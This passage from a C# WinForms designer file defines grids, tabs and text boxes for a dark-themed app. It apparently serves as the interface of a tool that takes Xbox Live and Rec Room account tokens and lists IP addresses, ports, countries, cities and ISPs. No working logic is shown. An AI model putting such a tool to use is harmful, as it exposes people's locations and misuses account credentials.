            this.guna2VScrollBar4.ScrollbarSize = 18;
            this.guna2VScrollBar4.Size = new System.Drawing.Size(18, 438);
            this.guna2VScrollBar4.TabIndex = 139;
            this.guna2VScrollBar4.ThumbColor = System.Drawing.Color.White;
            this.guna2VScrollBar4.ThumbSize = 5F;
            this.guna2VScrollBar4.Value = 1;
            // 
            // guna2DataGridView3
            // 
            this.guna2DataGridView3.AllowUserToResizeColumns = false;
            this.guna2DataGridView3.AllowUserToResizeRows = false;
            dataGridViewCellStyle14.BackColor = System.Drawing.Color.Black;
            dataGridViewCellStyle14.Font = new System.Drawing.Font("Segoe UI", 9F, System.Drawing.FontStyle.Bold);
            dataGridViewCellStyle14.ForeColor = System.Drawing.Color.White;
            dataGridViewCellStyle14.SelectionBackColor = System.Drawing.Color.FromArgb(((int)(((byte)(25)))), ((int)(((byte)(25)))), ((int)(((byte)(25)))));
            dataGridViewCellStyle14.SelectionForeColor = System.Drawing.Color.White;
            this.guna2DataGridView3.AlternatingRowsDefaultCellStyle = dataGridViewCellStyle14;
            this.guna2DataGridView3.BackgroundColor = System.Drawing.Color.Black;
            dataGridViewCellStyle15.Alignment = System.Windows.Forms.DataGridViewContentAlignment.MiddleLeft;
            dataGridViewCellStyle15.BackColor = System.Drawing.Color.Black;
            dataGridViewCellStyle15.Font = new System.Drawing.Font("Segoe UI", 9F, System.Drawing.FontStyle.Bold);
            dataGridViewCellStyle15.ForeColor = System.Drawing.Color.White;
            dataGridViewCellStyle15.SelectionBackColor = System.Drawing.Color.Black;
            dataGridViewCellStyle15.SelectionForeColor = System.Drawing.Color.White;
            dataGridViewCellStyle15.WrapMode = System.Windows.Forms.DataGridViewTriState.True;
            this.guna2DataGridView3.ColumnHeadersDefaultCellStyle = dataGridViewCellStyle15;
            this.guna2DataGridView3.ColumnHeadersHeight = 20;
            this.guna2DataGridView3.Columns.AddRange(new System.Windows.Forms.DataGridViewColumn[] {
            this.Column5,
            this.Column1,
            this.Column2,
            this.Column3,
            this.Column8,
            this.Column9,
            this.Column13,
            this.Column14});
            this.guna2DataGridView3.ContextMenuStrip = this.logInContextMenu5;
            this.Ani.SetDecoration(this.guna2DataGridView3, Guna.UI2.AnimatorNS.DecorationType.None);
            this.guna2Transition1.SetDecoration(this.guna2DataGridView3, Guna.UI2.AnimatorNS.DecorationType.None);
            dataGridViewCellStyle16.Alignment = System.Windows.Forms.DataGridViewContentAlignment.MiddleLeft;
            dataGridViewCellStyle16.BackColor = System.Drawing.Color.Black;
            dataGridViewCellStyle16.Font = new System.Drawing.Font("Segoe UI", 9F, System.Drawing.FontStyle.Bold);
            dataGridViewCellStyle16.ForeColor = System.Drawing.Color.White;
            dataGridViewCellStyle16.SelectionBackColor = System.Drawing.Color.FromArgb(((int)(((byte)(25)))), ((int)(((byte)(25)))), ((int)(((byte)(25)))));
            dataGridViewCellStyle16.SelectionForeColor = System.Drawing.Color.White;
            dataGridViewCellStyle16.WrapMode = System.Windows.Forms.DataGridViewTriState.False;
            this.guna2DataGridView3.DefaultCellStyle = dataGridViewCellStyle16;
            this.guna2DataGridView3.Dock = System.Windows.Forms.DockStyle.Fill;
            this.guna2DataGridView3.GridColor = System.Drawing.Color.FromArgb(((int)(((byte)(25)))), ((int)(((byte)(25)))), ((int)(((byte)(25)))));
            this.guna2DataGridView3.Location = new System.Drawing.Point(3, 3);
            this.guna2DataGridView3.Name = "guna2DataGridView3";
            this.guna2DataGridView3.ReadOnly = true;
            this.guna2DataGridView3.RowHeadersBorderStyle = System.Windows.Forms.DataGridViewHeaderBorderStyle.None;
            dataGridViewCellStyle17.Alignment = System.Windows.Forms.DataGridViewContentAlignment.MiddleLeft;
            dataGridViewCellStyle17.BackColor = System.Drawing.Color.Black;
            dataGridViewCellStyle17.Font = new System.Drawing.Font("Segoe UI", 9F, System.Drawing.FontStyle.Bold);
            dataGridViewCellStyle17.ForeColor = System.Drawing.Color.White;
            dataGridViewCellStyle17.SelectionBackColor = System.Drawing.Color.FromArgb(((int)(((byte)(25)))), ((int)(((byte)(25)))), ((int)(((byte)(25)))));
            dataGridViewCellStyle17.SelectionForeColor = System.Drawing.Color.White;
            dataGridViewCellStyle17.WrapMode = System.Windows.Forms.DataGridViewTriState.True;
            this.guna2DataGridView3.RowHeadersDefaultCellStyle = dataGridViewCellStyle17;
            this.guna2DataGridView3.RowHeadersVisible = false;
            this.guna2DataGridView3.RowHeadersWidth = 51;
            this.guna2DataGridView3.RowHeadersWidthSizeMode = System.Windows.Forms.DataGridViewRowHeadersWidthSizeMode.DisableResizing;
            dataGridViewCellStyle18.BackColor = System.Drawing.Color.Black;
            dataGridViewCellStyle18.Font = new System.Drawing.Font("Segoe UI", 9F, System.Drawing.FontStyle.Bold);
            dataGridViewCellStyle18.ForeColor = System.Drawing.Color.White;
            dataGridViewCellStyle18.SelectionBackColor = System.Drawing.Color.FromArgb(((int)(((byte)(25)))), ((int)(((byte)(25)))), ((int)(((byte)(25)))));
            dataGridViewCellStyle18.SelectionForeColor = System.Drawing.Color.White;
            this.guna2DataGridView3.RowsDefaultCellStyle = dataGridViewCellStyle18;
            this.guna2DataGridView3.RowTemplate.Height = 30;
            this.guna2DataGridView3.Size = new System.Drawing.Size(1083, 438);
            this.guna2DataGridView3.TabIndex = 165;
            this.guna2DataGridView3.ThemeStyle.AlternatingRowsStyle.BackColor = System.Drawing.Color.White;
            this.guna2DataGridView3.ThemeStyle.AlternatingRowsStyle.Font = null;
            this.guna2DataGridView3.ThemeStyle.AlternatingRowsStyle.ForeColor = System.Drawing.Color.Empty;
            this.guna2DataGridView3.ThemeStyle.AlternatingRowsStyle.SelectionBackColor = System.Drawing.Color.Empty;
            this.guna2DataGridView3.ThemeStyle.AlternatingRowsStyle.SelectionForeColor = System.Drawing.Color.Empty;
            this.guna2DataGridView3.ThemeStyle.BackColor = System.Drawing.Color.Black;
            this.guna2DataGridView3.ThemeStyle.GridColor = System.Drawing.Color.FromArgb(((int)(((byte)(25)))), ((int)(((byte)(25)))), ((int)(((byte)(25)))));
            this.guna2DataGridView3.ThemeStyle.HeaderStyle.BackColor = System.Drawing.Color.FromArgb(((int)(((byte)(100)))), ((int)(((byte)(88)))), ((int)(((byte)(255)))));
            this.guna2DataGridView3.ThemeStyle.HeaderStyle.BorderStyle = System.Windows.Forms.DataGridViewHeaderBorderStyle.None;
            this.guna2DataGridView3.ThemeStyle.HeaderStyle.Font = new System.Drawing.Font("Microsoft Sans Serif", 8.25F, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, ((byte)(0)));
            this.guna2DataGridView3.ThemeStyle.HeaderStyle.ForeColor = System.Drawing.Color.White;
            this.guna2DataGridView3.ThemeStyle.HeaderStyle.HeaightSizeMode = System.Windows.Forms.DataGridViewColumnHeadersHeightSizeMode.DisableResizing;
            this.guna2DataGridView3.ThemeStyle.HeaderStyle.Height = 20;
            this.guna2DataGridView3.ThemeStyle.ReadOnly = true;
            this.guna2DataGridView3.ThemeStyle.RowsStyle.BackColor = System.Drawing.Color.White;
            this.guna2DataGridView3.ThemeStyle.RowsStyle.BorderStyle = System.Windows.Forms.DataGridViewCellBorderStyle.SingleHorizontal;
            this.guna2DataGridView3.ThemeStyle.RowsStyle.Font = new System.Drawing.Font("Microsoft Sans Serif", 8.25F, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, ((byte)(0)));
            this.guna2DataGridView3.ThemeStyle.RowsStyle.ForeColor = System.Drawing.Color.FromArgb(((int)(((byte)(71)))), ((int)(((byte)(69)))), ((int)(((byte)(94)))));
            this.guna2DataGridView3.ThemeStyle.RowsStyle.Height = 30;
            this.guna2DataGridView3.ThemeStyle.RowsStyle.SelectionBackColor = System.Drawing.Color.FromArgb(((int)(((byte)(231)))), ((int)(((byte)(229)))), ((int)(((byte)(255)))));
            this.guna2DataGridView3.ThemeStyle.RowsStyle.SelectionForeColor = System.Drawing.Color.FromArgb(((int)(((byte)(71)))), ((int)(((byte)(69)))), ((int)(((byte)(94)))));
            // 
            // Column5
            // 
            this.Column5.FillWeight = 20F;
            this.Column5.HeaderText = "";
            this.Column5.MinimumWidth = 6;
            this.Column5.Name = "Column5";
            this.Column5.ReadOnly = true;
            // 
            // Column1
            // 
            this.Column1.HeaderText = "Label";
            this.Column1.MinimumWidth = 6;
            this.Column1.Name = "Column1";
            this.Column1.ReadOnly = true;
            this.Column1.Resizable = System.Windows.Forms.DataGridViewTriState.False;
            // 
            // Column2
            // 
            this.Column2.HeaderText = "IP Address";
            this.Column2.MinimumWidth = 6;
            this.Column2.Name = "Column2";
            this.Column2.ReadOnly = true;
            this.Column2.Resizable = System.Windows.Forms.DataGridViewTriState.False;
            // 
            // Column3
            // 
            this.Column3.FillWeight = 60F;
            this.Column3.HeaderText = "Port";
            this.Column3.MinimumWidth = 6;
            this.Column3.Name = "Column3";
            this.Column3.ReadOnly = true;
            this.Column3.Resizable = System.Windows.Forms.DataGridViewTriState.False;
            // 
            // Column8
            // 
            this.Column8.HeaderText = "Country";
            this.Column8.MinimumWidth = 6;
            this.Column8.Name = "Column8";
            this.Column8.ReadOnly = true;
            this.Column8.Resizable = System.Windows.Forms.DataGridViewTriState.False;
            // 
            // Column9
            // 
            this.Column9.HeaderText = "Region";
            this.Column9.MinimumWidth = 6;
            this.Column9.Name = "Column9";
            this.Column9.ReadOnly = true;
            this.Column9.Resizable = System.Windows.Forms.DataGridViewTriState.False;
            // 
            // Column13
            // 
            this.Column13.HeaderText = "City";
            this.Column13.MinimumWidth = 6;
            this.Column13.Name = "Column13";
            this.Column13.ReadOnly = true;
            this.Column13.Resizable = System.Windows.Forms.DataGridViewTriState.False;
            // 
            // Column14
            // 
            this.Column14.FillWeight = 200F;
            this.Column14.HeaderText = "ISP";
            this.Column14.MinimumWidth = 6;
            this.Column14.Name = "Column14";
            this.Column14.ReadOnly = true;
            this.Column14.Resizable = System.Windows.Forms.DataGridViewTriState.False;
            // 
            // xblToolTab
            // 
            this.xblToolTab.BackColor = System.Drawing.Color.Black;
            this.xblToolTab.Controls.Add(this.guna2GroupBox3);
            this.guna2Transition1.SetDecoration(this.xblToolTab, Guna.UI2.AnimatorNS.DecorationType.None);
            this.Ani.SetDecoration(this.xblToolTab, Guna.UI2.AnimatorNS.DecorationType.None);
            this.xblToolTab.Font = new System.Drawing.Font("Segoe UI", 9F, System.Drawing.FontStyle.Bold);
            this.xblToolTab.ForeColor = System.Drawing.Color.White;
            this.xblToolTab.Location = new System.Drawing.Point(4, 40);
            this.xblToolTab.Name = "xblToolTab";
            this.xblToolTab.Padding = new System.Windows.Forms.Padding(3);
            this.xblToolTab.Size = new System.Drawing.Size(1089, 444);
            this.xblToolTab.TabIndex = 2;
            this.xblToolTab.Text = "XBL Tool";
            // 
            // guna2GroupBox3
            // 
            this.guna2GroupBox3.BorderColor = System.Drawing.Color.FromArgb(((int)(((byte)(25)))), ((int)(((byte)(25)))), ((int)(((byte)(25)))));
            this.guna2GroupBox3.BorderThickness = 0;
            this.guna2GroupBox3.Controls.Add(this.guna2Panel4);
            this.guna2GroupBox3.Controls.Add(this.guna2Panel5);
            this.guna2GroupBox3.Controls.Add(this.guna2Button9);
            this.guna2GroupBox3.Controls.Add(this.guna2Button8);
            this.guna2GroupBox3.CustomBorderColor = System.Drawing.Color.FromArgb(((int)(((byte)(25)))), ((int)(((byte)(25)))), ((int)(((byte)(25)))));
            this.guna2Transition1.SetDecoration(this.guna2GroupBox3, Guna.UI2.AnimatorNS.DecorationType.None);
            this.Ani.SetDecoration(this.guna2GroupBox3, Guna.UI2.AnimatorNS.DecorationType.None);
            this.guna2GroupBox3.Dock = System.Windows.Forms.DockStyle.Fill;
            this.guna2GroupBox3.FillColor = System.Drawing.Color.Black;
            this.guna2GroupBox3.Font = new System.Drawing.Font("Segoe UI", 9F, System.Drawing.FontStyle.Bold);
            this.guna2GroupBox3.ForeColor = System.Drawing.Color.White;
            this.guna2GroupBox3.Location = new System.Drawing.Point(3, 3);
            this.guna2GroupBox3.Name = "guna2GroupBox3";
            this.guna2GroupBox3.Size = new System.Drawing.Size(1083, 438);
            this.guna2GroupBox3.TabIndex = 717;
            this.guna2GroupBox3.Text = "XBL Token Login";
            this.guna2GroupBox3.Click += new System.EventHandler(this.guna2GroupBox3_Click_1);
            // 
            // guna2Panel4
            // 
            this.guna2Panel4.Anchor = ((System.Windows.Forms.AnchorStyles)(((System.Windows.Forms.AnchorStyles.Top | System.Windows.Forms.AnchorStyles.Left) 
            | System.Windows.Forms.AnchorStyles.Right)));
            this.guna2Panel4.Controls.Add(this.guna2TextBox2);
            this.guna2Panel4.Controls.Add(this.guna2Button3);
            this.Ani.SetDecoration(this.guna2Panel4, Guna.UI2.AnimatorNS.DecorationType.None);
            this.guna2Transition1.SetDecoration(this.guna2Panel4, Guna.UI2.AnimatorNS.DecorationType.None);
            this.guna2Panel4.Location = new System.Drawing.Point(-5, 48);
            this.guna2Panel4.Name = "guna2Panel4";
            this.guna2Panel4.Size = new System.Drawing.Size(1089, 50);
            this.guna2Panel4.TabIndex = 146;
            // 
            // guna2TextBox2
            // 
            this.guna2TextBox2.Anchor = ((System.Windows.Forms.AnchorStyles)(((System.Windows.Forms.AnchorStyles.Top | System.Windows.Forms.AnchorStyles.Left) 
            | System.Windows.Forms.AnchorStyles.Right)));
            this.guna2TextBox2.Animated = true;
            this.guna2TextBox2.BackColor = System.Drawing.Color.FromArgb(((int)(((byte)(25)))), ((int)(((byte)(25)))), ((int)(((byte)(25)))));
            this.guna2TextBox2.BorderColor = System.Drawing.Color.FromArgb(((int)(((byte)(25)))), ((int)(((byte)(25)))), ((int)(((byte)(25)))));
            this.guna2TextBox2.BorderThickness = 0;
            this.guna2TextBox2.Cursor = System.Windows.Forms.Cursors.IBeam;
            this.Ani.SetDecoration(this.guna2TextBox2, Guna.UI2.AnimatorNS.DecorationType.None);
            this.guna2Transition1.SetDecoration(this.guna2TextBox2, Guna.UI2.AnimatorNS.DecorationType.None);
            this.guna2TextBox2.DefaultText = "";
            this.guna2TextBox2.DisabledState.ForeColor = System.Drawing.Color.White;
            this.guna2TextBox2.DisabledState.PlaceholderForeColor = System.Drawing.Color.White;
            this.guna2TextBox2.FillColor = System.Drawing.Color.FromArgb(((int)(((byte)(25)))), ((int)(((byte)(25)))), ((int)(((byte)(25)))));
            this.guna2TextBox2.FocusedState.ForeColor = System.Drawing.Color.White;
            this.guna2TextBox2.FocusedState.PlaceholderForeColor = System.Drawing.Color.White;
            this.guna2TextBox2.Font = new System.Drawing.Font("Segoe UI", 9F, System.Drawing.FontStyle.Bold);
            this.guna2TextBox2.ForeColor = System.Drawing.Color.White;
            this.guna2TextBox2.HoverState.ForeColor = System.Drawing.Color.White;
            this.guna2TextBox2.HoverState.PlaceholderForeColor = System.Drawing.Color.White;
            this.guna2TextBox2.Location = new System.Drawing.Point(4, 4);
            this.guna2TextBox2.Margin = new System.Windows.Forms.Padding(3, 4, 3, 4);
            this.guna2TextBox2.Name = "guna2TextBox2";
            this.guna2TextBox2.PasswordChar = '\0';
            this.guna2TextBox2.PlaceholderForeColor = System.Drawing.Color.White;
            this.guna2TextBox2.PlaceholderText = "XBL Token";
            this.guna2TextBox2.SelectedText = "";
            this.guna2TextBox2.Size = new System.Drawing.Size(871, 36);
            this.guna2TextBox2.TabIndex = 140;
            // 
            // guna2Panel5
            // 
            this.guna2Panel5.Anchor = ((System.Windows.Forms.AnchorStyles)(((System.Windows.Forms.AnchorStyles.Top | System.Windows.Forms.AnchorStyles.Left) 
            | System.Windows.Forms.AnchorStyles.Right)));
            this.guna2Panel5.Controls.Add(this.guna2Button5);
            this.guna2Panel5.Controls.Add(this.guna2TextBox5);
            this.Ani.SetDecoration(this.guna2Panel5, Guna.UI2.AnimatorNS.DecorationType.None);
            this.guna2Transition1.SetDecoration(this.guna2Panel5, Guna.UI2.AnimatorNS.DecorationType.None);
            this.guna2Panel5.Location = new System.Drawing.Point(-5, 48);
            this.guna2Panel5.Name = "guna2Panel5";
            this.guna2Panel5.Size = new System.Drawing.Size(1089, 50);
            this.guna2Panel5.TabIndex = 147;
            // 
            // guna2TextBox5
            // 
            this.guna2TextBox5.Anchor = ((System.Windows.Forms.AnchorStyles)(((System.Windows.Forms.AnchorStyles.Top | System.Windows.Forms.AnchorStyles.Left) 
            | System.Windows.Forms.AnchorStyles.Right)));
            this.guna2TextBox5.Animated = true;
            this.guna2TextBox5.BackColor = System.Drawing.Color.FromArgb(((int)(((byte)(25)))), ((int)(((byte)(25)))), ((int)(((byte)(25)))));
            this.guna2TextBox5.BorderColor = System.Drawing.Color.FromArgb(((int)(((byte)(25)))), ((int)(((byte)(25)))), ((int)(((byte)(25)))));
            this.guna2TextBox5.BorderThickness = 0;
            this.guna2TextBox5.Cursor = System.Windows.Forms.Cursors.IBeam;
            this.Ani.SetDecoration(this.guna2TextBox5, Guna.UI2.AnimatorNS.DecorationType.None);
            this.guna2Transition1.SetDecoration(this.guna2TextBox5, Guna.UI2.AnimatorNS.DecorationType.None);
            this.guna2TextBox5.DefaultText = "";
            this.guna2TextBox5.DisabledState.ForeColor = System.Drawing.Color.White;
            this.guna2TextBox5.DisabledState.PlaceholderForeColor = System.Drawing.Color.White;
            this.guna2TextBox5.FillColor = System.Drawing.Color.FromArgb(((int)(((byte)(25)))), ((int)(((byte)(25)))), ((int)(((byte)(25)))));
            this.guna2TextBox5.FocusedState.ForeColor = System.Drawing.Color.White;
            this.guna2TextBox5.FocusedState.PlaceholderForeColor = System.Drawing.Color.White;
            this.guna2TextBox5.Font = new System.Drawing.Font("Segoe UI", 9F, System.Drawing.FontStyle.Bold);
            this.guna2TextBox5.ForeColor = System.Drawing.Color.White;
            this.guna2TextBox5.HoverState.ForeColor = System.Drawing.Color.White;
            this.guna2TextBox5.HoverState.PlaceholderForeColor = System.Drawing.Color.White;
            this.guna2TextBox5.Location = new System.Drawing.Point(4, 4);
            this.guna2TextBox5.Margin = new System.Windows.Forms.Padding(3, 4, 3, 4);
            this.guna2TextBox5.Name = "guna2TextBox5";
            this.guna2TextBox5.PasswordChar = '\0';
            this.guna2TextBox5.PlaceholderForeColor = System.Drawing.Color.White;
            this.guna2TextBox5.PlaceholderText = "Rec room Account Token";
            this.guna2TextBox5.SelectedText = "";
            this.guna2TextBox5.Size = new System.Drawing.Size(871, 36);
            this.guna2TextBox5.TabIndex = 144;
            // 
            // guna2Button9
            // 
            this.guna2Button9.Animated = true;
            this.guna2Button9.BackColor = System.Drawing.Color.FromArgb(((int)(((byte)(25)))), ((int)(((byte)(25)))), ((int)(((byte)(25)))));
            this.guna2Button9.BorderColor = System.Drawing.Color.Empty;
            this.guna2Button9.BorderThickness = 1;
            this.guna2Button9.CheckedState.BorderColor = System.Drawing.Color.FromArgb(((int)(((byte)(25)))), ((int)(((byte)(25)))), ((int)(((byte)(25)))));
            this.guna2Button9.CheckedState.CustomBorderColor = System.Drawing.Color.FromArgb(((int)(((byte)(25)))), ((int)(((byte)(25)))), ((int)(((byte)(25)))));
            this.guna2Button9.CheckedState.FillColor = System.Drawing.Color.FromArgb(((int)(((byte)(25)))), ((int)(((byte)(25)))), ((int)(((byte)(25)))));
            this.guna2Button9.CheckedState.ForeColor = System.Drawing.Color.White;
            this.guna2Button9.Cursor = System.Windows.Forms.Cursors.Default;
            this.guna2Button9.CustomBorderColor = System.Drawing.Color.Transparent;
            this.Ani.SetDecoration(this.guna2Button9, Guna.UI2.AnimatorNS.DecorationType.None);
            this.guna2Transition1.SetDecoration(this.guna2Button9, Guna.UI2.AnimatorNS.DecorationType.None);
            this.guna2Button9.DisabledState.BorderColor = System.Drawing.Color.FromArgb(((int)(((byte)(25)))), ((int)(((byte)(25)))), ((int)(((byte)(25)))));
            this.guna2Button9.DisabledState.CustomBorderColor = System.Drawing.Color.FromArgb(((int)(((byte)(25)))), ((int)(((byte)(25)))), ((int)(((byte)(25)))));
            this.guna2Button9.DisabledState.FillColor = System.Drawing.Color.FromArgb(((int)(((byte)(0)))), ((int)(((byte)(86)))), ((int)(((byte)(179)))));
            this.guna2Button9.DisabledState.ForeColor = System.Drawing.Color.White;
            this.guna2Button9.FillColor = System.Drawing.Color.FromArgb(((int)(((byte)(25)))), ((int)(((byte)(25)))), ((int)(((byte)(25)))));
            this.guna2Button9.Font = new System.Drawing.Font("Segoe UI", 9F, System.Drawing.FontStyle.Bold);
            this.guna2Button9.ForeColor = System.Drawing.Color.White;
            this.guna2Button9.HoverState.ForeColor = System.Drawing.Color.White;
            this.guna2Button9.Location = new System.Drawing.Point(134, 104);
            this.guna2Button9.Name = "guna2Button9";
            this.guna2Button9.PressedColor = System.Drawing.Color.FromArgb(((int)(((byte)(25)))), ((int)(((byte)(25)))), ((int)(((byte)(25)))));
            this.guna2Button9.Size = new System.Drawing.Size(129, 41);
            this.guna2Button9.TabIndex = 165;
            this.guna2Button9.Text = "Rec Room Tool";
            this.guna2Button9.Click += new System.EventHandler(this.guna2Button9_Click_2);
            // 
            // guna2Button8
            // 
            this.guna2Button8.Animated = true;
            this.guna2Button8.BackColor = System.Drawing.Color.FromArgb(((int)(((byte)(25)))), ((int)(((byte)(25)))), ((int)(((byte)(25)))));
            this.guna2Button8.BorderColor = System.Drawing.Color.Empty;
            this.guna2Button8.BorderThickness = 1;
            this.guna2Button8.CheckedState.BorderColor = System.Drawing.Color.FromArgb(((int)(((byte)(25)))), ((int)(((byte)(25)))), ((int)(((byte)(25)))));
            this.guna2Button8.CheckedState.CustomBorderColor = System.Drawing.Color.FromArgb(((int)(((byte)(25)))), ((int)(((byte)(25)))), ((int)(((byte)(25)))));
            this.guna2Button8.CheckedState.FillColor = System.Drawing.Color.FromArgb(((int)(((byte)(25)))), ((int)(((byte)(25)))), ((int)(((byte)(25)))));
            this.guna2Button8.CheckedState.ForeColor = System.Drawing.Color.White;
            this.guna2Button8.Cursor = System.Windows.Forms.Cursors.Default;
            this.guna2Button8.CustomBorderColor = System.Drawing.Color.Transparent;
            this.Ani.SetDecoration(this.guna2Button8, Guna.UI2.AnimatorNS.DecorationType.None);
            this.guna2Transition1.SetDecoration(this.guna2Button8, Guna.UI2.AnimatorNS.DecorationType.None);
            this.guna2Button8.DisabledState.BorderColor = System.Drawing.Color.FromArgb(((int)(((byte)(25)))), ((int)(((byte)(25)))), ((int)(((byte)(25)))));
            this.guna2Button8.DisabledState.CustomBorderColor = System.Drawing.Color.FromArgb(((int)(((byte)(25)))), ((int)(((byte)(25)))), ((int)(((byte)(25)))));
            this.guna2Button8.DisabledState.FillColor = System.Drawing.Color.FromArgb(((int)(((byte)(0)))), ((int)(((byte)(86)))), ((int)(((byte)(179)))));
            this.guna2Button8.DisabledState.ForeColor = System.Drawing.Color.White;
            this.guna2Button8.FillColor = System.Drawing.Color.FromArgb(((int)(((byte)(25)))), ((int)(((byte)(25)))), ((int)(((byte)(25)))));
            this.guna2Button8.Font = new System.Drawing.Font("Segoe UI", 9F, System.Drawing.FontStyle.Bold);
            this.guna2Button8.ForeColor = System.Drawing.Color.White;
            this.guna2Button8.HoverState.ForeColor = System.Drawing.Color.White;
            this.guna2Button8.Location = new System.Drawing.Point(-1, 104);
            this.guna2Button8.Name = "guna2Button8";
            this.guna2Button8.PressedColor = System.Drawing.Color.FromArgb(((int)(((byte)(25)))), ((int)(((byte)(25)))), ((int)(((byte)(25)))));
            this.guna2Button8.Size = new System.Drawing.Size(129, 41);
            this.guna2Button8.TabIndex = 164;
            this.guna2Button8.Text = "Xbox Tool";
            this.guna2Button8.Click += new System.EventHandler(this.guna2Button8_Click_1);
            // 
            // PcTab
            // 
            this.PcTab.BackColor = System.Drawing.Color.Black;
            this.PcTab.Controls.Add(this.Pcdecryption);
            this.guna2Transition1.SetDecoration(this.PcTab, Guna.UI2.AnimatorNS.DecorationType.None);
            this.Ani.SetDecoration(this.PcTab, Guna.UI2.AnimatorNS.DecorationType.None);
            this.PcTab.Location = new System.Drawing.Point(4, 40);
            this.PcTab.Name = "PcTab";
            this.PcTab.Padding = new System.Windows.Forms.Padding(3);
            this.PcTab.Size = new System.Drawing.Size(1089, 444);
            this.PcTab.TabIndex = 7;
            this.PcTab.Text = "PC";
            // 
            // Pcdecryption
            // 
            this.Pcdecryption.AllowUserToAddRows = false;
            this.Pcdecryption.AllowUserToResizeColumns = false;
            this.Pcdecryption.AllowUserToResizeRows = false;
            dataGridViewCellStyle19.BackColor = System.Drawing.Color.Black;
            dataGridViewCellStyle19.Font = new System.Drawing.Font("Segoe UI", 9F, System.Drawing.FontStyle.Bold);
            dataGridViewCellStyle19.ForeColor = System.Drawing.Color.White;
            dataGridViewCellStyle19.SelectionBackColor = System.Drawing.Color.FromArgb(((int)(((byte)(25)))), ((int)(((byte)(25)))), ((int)(((byte)(25)))));
            dataGridViewCellStyle19.SelectionForeColor = System.Drawing.Color.White;
            this.Pcdecryption.AlternatingRowsDefaultCellStyle = dataGridViewCellStyle19;
            this.Pcdecryption.BackgroundColor = System.Drawing.Color.Black;
            dataGridViewCellStyle20.Alignment = System.Windows.Forms.DataGridViewContentAlignment.MiddleLeft;
            dataGridViewCellStyle20.BackColor = System.Drawing.Color.Black;
            dataGridViewCellStyle20.Font = new System.Drawing.Font("Segoe UI", 9F, System.Drawing.FontStyle.Bold);
            dataGridViewCellStyle20.ForeColor = System.Drawing.Color.White;
            dataGridViewCellStyle20.SelectionBackColor = System.Drawing.Color.Black;
            dataGridViewCellStyle20.SelectionForeColor = System.Drawing.Color.White;
            dataGridViewCellStyle20.WrapMode = System.Windows.Forms.DataGridViewTriState.True;
            this.Pcdecryption.ColumnHeadersDefaultCellStyle = dataGridViewCellStyle20;
            this.Pcdecryption.ColumnHeadersHeight = 20;
            this.Pcdecryption.Columns.AddRange(new System.Windows.Forms.DataGridViewColumn[] {
            this.dataGridViewImageColumn1,
            this.dataGridViewTextBoxColumn8,
            this.dataGridViewTextBoxColumn9,
            this.dataGridViewTextBoxColumn10,
            this.dataGridViewTextBoxColumn11,
            this.dataGridViewTextBoxColumn12,
            this.dataGridViewTextBoxColumn13,
            this.dataGridViewTextBoxColumn14});
            this.Pcdecryption.ContextMenuStrip = this.PcContext;
            this.Ani.SetDecoration(this.Pcdecryption, Guna.UI2.AnimatorNS.DecorationType.None);
            this.guna2Transition1.SetDecoration(this.Pcdecryption, Guna.UI2.AnimatorNS.DecorationType.None);
            dataGridViewCellStyle21.Alignment = System.Windows.Forms.DataGridViewContentAlignment.MiddleLeft;
            dataGridViewCellStyle21.BackColor = System.Drawing.Color.Black;
            dataGridViewCellStyle21.Font = new System.Drawing.Font("Segoe UI", 9F, System.Drawing.FontStyle.Bold);
            dataGridViewCellStyle21.ForeColor = System.Drawing.Color.Transparent;
            dataGridViewCellStyle21.SelectionBackColor = System.Drawing.Color.FromArgb(((int)(((byte)(25)))), ((int)(((byte)(25)))), ((int)(((byte)(25)))));
            dataGridViewCellStyle21.SelectionForeColor = System.Drawing.Color.White;
            dataGridViewCellStyle21.WrapMode = System.Windows.Forms.DataGridViewTriState.False;
            this.Pcdecryption.DefaultCellStyle = dataGridViewCellStyle21;
            this.Pcdecryption.Dock = System.Windows.Forms.DockStyle.Fill;
            this.Pcdecryption.GridColor = System.Drawing.Color.FromArgb(((int)(((byte)(25)))), ((int)(((byte)(25)))), ((int)(((byte)(25)))));
            this.Pcdecryption.Location = new System.Drawing.Point(3, 3);
            this.Pcdecryption.Name = "Pcdecryption";
            this.Pcdecryption.ReadOnly = true;
            this.Pcdecryption.RowHeadersBorderStyle = System.Windows.Forms.DataGridViewHeaderBorderStyle.None;
            dataGridViewCellStyle22.Alignment = System.Windows.Forms.DataGridViewContentAlignment.MiddleLeft;
            dataGridViewCellStyle22.BackColor = System.Drawing.Color.Black;
            dataGridViewCellStyle22.Font = new System.Drawing.Font("Segoe UI", 9F, System.Drawing.FontStyle.Bold);
            dataGridViewCellStyle22.ForeColor = System.Drawing.Color.White;
            dataGridViewCellStyle22.SelectionBackColor = System.Drawing.Color.FromArgb(((int)(((byte)(25)))), ((int)(((byte)(25)))), ((int)(((byte)(25)))));
            dataGridViewCellStyle22.SelectionForeColor = System.Drawing.Color.White;
            dataGridViewCellStyle22.WrapMode = System.Windows.Forms.DataGridViewTriState.True;
            this.Pcdecryption.RowHeadersDefaultCellStyle = dataGridViewCellStyle22;
            this.Pcdecryption.RowHeadersVisible = false;
            this.Pcdecryption.RowHeadersWidth = 51;
            this.Pcdecryption.RowHeadersWidthSizeMode = System.Windows.Forms.DataGridViewRowHeadersWidthSizeMode.DisableResizing;
            dataGridViewCellStyle23.BackColor = System.Drawing.Color.Black;
            dataGridViewCellStyle23.Font = new System.Drawing.Font("Segoe UI", 9F, System.Drawing.FontStyle.Bold);
            dataGridViewCellStyle23.ForeColor = System.Drawing.Color.White;
            dataGridViewCellStyle23.SelectionBackColor = System.Drawing.Color.FromArgb(((int)(((byte)(25)))), ((int)(((byte)(25)))), ((int)(((byte)(25)))));
            dataGridViewCellStyle23.SelectionForeColor = System.Drawing.Color.White;
            this.Pcdecryption.RowsDefaultCellStyle = dataGridViewCellStyle23;
            this.Pcdecryption.RowTemplate.Height = 30;
            this.Pcdecryption.Size = new System.Drawing.Size(1083, 438);
            this.Pcdecryption.TabIndex = 167;
            this.Pcdecryption.ThemeStyle.AlternatingRowsStyle.BackColor = System.Drawing.Color.White;
            this.Pcdecryption.ThemeStyle.AlternatingRowsStyle.Font = null;
            this.Pcdecryption.ThemeStyle.AlternatingRowsStyle.ForeColor = System.Drawing.Color.Empty;
            this.Pcdecryption.ThemeStyle.AlternatingRowsStyle.SelectionBackColor = System.Drawing.Color.Empty;
